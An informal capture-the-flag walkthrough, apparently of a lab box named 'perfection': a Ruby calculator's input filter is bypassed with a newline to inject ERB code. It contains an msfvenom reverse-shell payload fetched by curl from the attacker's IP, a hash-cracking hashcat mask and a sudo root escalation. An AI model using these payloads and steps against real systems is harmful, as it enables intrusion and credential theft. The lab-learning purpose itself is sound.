in webpage we see a some Calculator

using Webrick 1.7.0 running on ruby

nothing interesing

on of parameters in calculator might be vulnerable to SSTI

return some results

using parameter category1 

test'

and we get Malicious input blocked 

%0A will help me to bypass the filter

test%0A'<%25%3d+system('whoami')+%25>

returns me 'true'

creating payload :
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.125 LPORT=4445 -f elf -o r45

opening python server and uploading the payload to machine

everything should be URL encoded 
after that we doing 

"curl+http%3a//10.10.16.125%3a80/r45+-o+/tmp/r45"

"chmod+%2bx+/tmp/r45"

"cd /tmp;./r45"

and we get the reverse shell as susan 

going for user flag:

sudo -l:

in ~/Migration there is a .db files

downloaded it via meterpreter shell

    download ~/Migration/pupilpath_credentials.db

opened the file with DB Browser for SQLite 

there is some users with hashed passwords

in the web page mentioned only 2 people Susan and Tina 

took the Tinas hash and paste it to file

hash identifier said it SHA 256

in /var/spool/mail/susan there is a hint for a decryption format:
    Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

    in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

    {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

    Note that all letters of the first name should be convered into lowercase.

    Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

    - Tina, your delightful student

hashcat -m 1400 -a 3 susan.txt susan_nasus_?d?d?d?d?d?d?d?d?d

result:
    abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210


now lets try to connect via ssh with this credentials

ssh susan@10.10.11.253

entering the password and we get the shell as susan

sudo -l:
    [sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL

now i can switch to root 

sudo su and we get the root 

root flag:
